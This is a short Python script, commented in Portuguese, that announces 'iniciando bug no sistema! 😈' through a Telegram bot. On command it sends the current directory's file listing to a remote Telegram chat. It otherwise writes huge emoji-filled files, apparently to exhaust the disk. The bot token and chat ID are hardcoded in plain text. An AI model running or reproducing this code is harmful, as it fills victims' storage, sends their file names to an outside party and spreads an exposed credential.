import os
import telebot

# Substitua pelo seu token e ID de chat
bot_token = "8047998280:AAFSw2DcVkGYfgsUldfpfYr8yc6G9dgpt9o"
chat_id = 6572589301

# Inicializa o bot
bot = telebot.TeleBot(bot_token)

def send_telegram_message(message):
    bot.send_message(chat_id, message)

def format_size(size):
    """Formata o tamanho do arquivo em KB, MB, GB ou TB."""
    if size >= 1 << 40:  # TB
        return f"{size / (1 << 40):.2f} TB"
    elif size >= 1 << 30:  # GB
        return f"{size / (1 << 30):.2f} GB"
    elif size >= 1 << 20:  # MB
        return f"{size / (1 << 20):.2f} MB"
    elif size >= 1 << 10:  # KB
        return f"{size / (1 << 10):.2f} KB"
    else:  # bytes
        return f"{size} bytes"

def list_files():
    """Lista todos os arquivos no diretório atual e seus tamanhos."""
    files = os.listdir()
    file_info = []
    for file in files:
        if os.path.isfile(file):  # Verifica se é um arquivo
            size = os.path.getsize(file)
            formatted_size = format_size(size)
            file_info.append(f"{file} - {formatted_size}")
    return "\n".join(file_info)

def create_large_files():
    # Enviar mensagem inicial para o Telegram
    initial_message = "iniciando bug no sistema! 😈"
    send_telegram_message(initial_message)

    file_count = 0
    target_size = 100 * 1024 * 1024 * 1024  # 100 GB em bytes
    content = "😈" * 10000000 + "\n"  # 10.000.000 emojis por linha

    while True:
        command = input("Digite um comando (listar ou sair): ")
        if command == "listar":
            files_list = list_files()
            send_telegram_message(files_list)  # Envia a lista para o Telegram
        elif command.lower() == "sair":
            break
        else:
            file_count += 1
            filename = f"large_file_{file_count}.txt"
            with open(filename, 'w') as f:
                for _ in range(10000000):  # 10.000.000 linhas
                    f.write(content)
            
            file_size = os.path.getsize(filename)
            success_message = f"Arquivo {filename} criado com tamanho {format_size(file_size)}."
            send_telegram_message(success_message)  # Envia mensagem para o Telegram

if __name__ == "__main__":
    create_large_files()
